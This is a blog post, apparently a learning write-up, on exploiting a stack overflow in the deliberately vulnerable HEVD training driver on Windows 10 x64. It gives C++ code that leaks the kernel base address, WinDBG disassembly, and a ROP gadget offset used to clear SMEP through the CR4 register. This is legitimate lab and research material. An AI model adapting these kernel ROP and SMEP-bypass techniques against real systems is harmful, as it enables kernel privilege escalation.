---
layout: single
title: HEVD Exploits -- Windows 10 x64 Stack Overflow SMEP Bypass
date: 2020-05-04
classes: wide
header:
  teaser: /assets/images/avatar.jpg
tags:
  - Exploit Dev
  - Drivers
  - Windows 10
  - x64
  - Shellcoding
  - SMEP
---

## Introduction
This is going to be my last HEVD blog post. This was all of the exploits I wanted to hit when I started this goal in late January. We did quite a few, there are some definitely interesting ones left on the table and there is all of the Linux exploits as well. I'll speak more about future posts in a future post (haha). I used [Hacksys Extreme Vulnerable Driver 2.0](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver) and Windows 10 Build 14393.rs1_release.160715-1616 for this exploit. Some of the newer Windows 10 builds were bugchecking this technique and weren't allowing me to complete it. 

## Thanks
- To [@Cneelis](https://twitter.com/Cneelis) for having such great shellcode in his similar exploit on a different Windows 10 build here: https://github.com/Cn33liz/HSEVD-StackOverflowX64/blob/master/HS-StackOverflowX64/HS-StackOverflowX64.c 
- To [@abatchy17](https://twitter.com/abatchy17) for his awesome blog post on his SMEP bypass here: https://www.abatchy.com/2018/01/kernel-exploitation-4
- To [@ihack4falafel](https://twitter.com/ihack4falafel) for helping me figure out where to return to after running my shellcode.

And as this is the last HEVD blog post, thanks to everyone who got me this far. As I've said every post so far, nothing I was doing is my own idea or technique, was simply recreating their exploits (or at least trying to) in order to learn more about the bug classes and learn more about the Windows kernel. (More thoughts on this later in a future blog post). 

## SMEP
We've already completed a Stack Overflow exploit for HEVD on Windows 7 x64 [here](https://h0mbre.github.io/HEVD_Stackoverflow_64bit/); however, the problem is that starting with Windows 8, Microsoft implemented a new mitigation by default called Supervisor Mode Execution Prevention ([SMEP](https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf)). SMEP detects kernel mode code running in userspace stops us from being able to hijack execution in the kernel and send it to our shellcode pointer residing in userspace.

## Bypassing SMEP
Taking my cues from Abatchy, I decided to try and bypass SMEP by using a well-known ROP chain technique that utilizes segments of code in the kernel to disable SMEP and **then** heads to user space to call our shellcode. 

In the linked material above, you see that the `CR4` register is responsible for enforcing this protection and if we look at [Wikipedia](https://en.wikipedia.org/wiki/Control_register#SMEP), we can get a complete breakdown of CR4 and what its responsibilities are: 

> Bit Name  Fullname                                      Description

> 20	SMEP  Supervisor Mode Execution Protection Enable	  If set, execution of code in a higher ring generates a fault.

So the 20th bit of the `CR4` indicates whether or not SMEP is enforced. Since this vulnerability we're attacking gives us the ability to overwrite the stack, we're going to utilize a ROP chain consisting only of kernel space gadgets to disable SMEP by placing a new value in `CR4` and then hit our shellcode in userspace. 

## Getting Kernel Base Address
The first thing we want to do, is to get the base address of the kernel. If we don't get the base address, we can't figure out what the offsets are to our gadgets that we want to use to bypass ASLR. In WinDBG, you can simply run `lm sm` to list all loaded kernel modules alphabetically:
```
---SNIP---
fffff800`10c7b000 fffff800`1149b000   nt
---SNIP---
```

We need a way also to get this address in our exploit code. For this part, I leaned heavily on code I was able to find by doing google searches with some syntax like: `site:github.com NtQuerySystemInformation` and seeing what I could find. Luckily, I was able to find a lot of code that met my needs perfectly. Unfortunately, on Windows 10 in order to use this API your process requires some level of elevation. But, I had already used the API previously and was quite fond of it for giving me so much trouble the first time I used it to get the kernel base address and wanted to use it again but this time in C++ instead of Python. 

Using a lot of the tricks that I learned from @tekwizz123's HEVD exploits, I was able to get the API exported to my exploit code and was able to use it effectively. I won't go too much into the code here, but this is the function and the typedefs it references to retrieve the base address to the kernel for us:
```cpp
typedef struct SYSTEM_MODULE {
    ULONG                Reserved1;
    ULONG                Reserved2;
    ULONG				 Reserved3;
    PVOID                ImageBaseAddress;
    ULONG                ImageSize;
    ULONG                Flags;
    WORD                 Id;
    WORD                 Rank;
    WORD                 LoadCount;
    WORD                 NameOffset;
    CHAR                 Name[256];
}SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
    ULONG                ModulesCount;
    SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemModuleInformation = 0xb
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
    );

INT64 get_kernel_base() {

    cout << "[>] Getting kernel base address..." << endl;

    //https://github.com/koczkatamas/CVE-2016-0051/blob/master/EoP/Shellcode/Shellcode.cpp
    //also using the same import technique that @tekwizz123 showed us

    PNtQuerySystemInformation NtQuerySystemInformation =
        (PNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"),
            "NtQuerySystemInformation");

    if (!NtQuerySystemInformation) {

        cout << "[!] Failed to get the address of NtQuerySystemInformation." << endl;
        cout << "[!] Last error " << GetLastError() << endl;
        exit(1);
    }

    ULONG len = 0;
    NtQuerySystemInformation(SystemModuleInformation,
        NULL,
        0,
        &len);

    PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)
        VirtualAlloc(NULL,
            len,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE);

    NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation,
        pModuleInfo,
        len,
        &len);

    if (status != (NTSTATUS)0x0) {
        cout << "[!] NtQuerySystemInformation failed!" << endl;
        exit(1);
    }

    PVOID kernelImageBase = pModuleInfo->Modules[0].ImageBaseAddress;

    cout << "[>] ntoskrnl.exe base address: 0x" << hex << kernelImageBase << endl;

    return (INT64)kernelImageBase;
}
```

This code imports `NtQuerySystemInformation` from `nt.dll` and allows us to use it with the `System Module Information` parameter which returns to us a nice struct of a `ModulesCount` (how many kernel modules are loaded) and an array of the `Modules` themselves which have a lot of struct members included a `Name`. In all my research I couldn't find an example where the kernel image wasn't index value `0` so that's what I've implemented here. 

You could use a lot of the cool `string` functions in C++ to easily get the base address of any kernel mode driver as long as you have the name of the `.sys` file. You could cast the `Modules.Name` member to a string and do a substring match routine to locate your desired driver as you iterate through the array and return the base address. So now that we have the base address figured out, we can move on to hunting the gadgets.

## Hunting Gadgets

Again, just following along with Abatchy's blog, we can find the first gadget (actually the 2nd in our code) by locating a gadget that allows us to place a value into `cr4` easily and then takes a `ret` soon after. Luckily for us, this gadget exists inside of `nt!HvlEndSystemInterrupt`. 

We can find it in WinDBG with the following:
```
kd> uf HvlEndSystemInterrupt
nt!HvlEndSystemInterrupt:
fffff800`10dc1560 4851            push    rcx
fffff800`10dc1562 50              push    rax
fffff800`10dc1563 52              push    rdx
fffff800`10dc1564 65488b142588610000 mov   rdx,qword ptr gs:[6188h]
fffff800`10dc156d b970000040      mov     ecx,40000070h
fffff800`10dc1572 0fba3200        btr     dword ptr [rdx],0
fffff800`10dc1576 7206            jb      nt!HvlEndSystemInterrupt+0x1e (fffff800`10dc157e)

nt!HvlEndSystemInterrupt+0x18:
fffff800`10dc1578 33c0            xor     eax,eax
fffff800`10dc157a 8bd0            mov     edx,eax
fffff800`10dc157c 0f30            wrmsr

nt!HvlEndSystemInterrupt+0x1e:
fffff800`10dc157e 5a              pop     rdx
fffff800`10dc157f 58              pop     rax
fffff800`10dc1580 59              pop     rcx								// Gadget at offset from nt: +0x146580
fffff800`10dc1581 c3              ret
```

As Abatchy did, I've added a comment so you can see the gadget we're after. We want this:
`pop rcx`

`ret`
routine because if we can place an arbitrary value into `rcx`, there is a second gadget which allows us to `mov cr4, rcx` and then we'd have everything we need. 
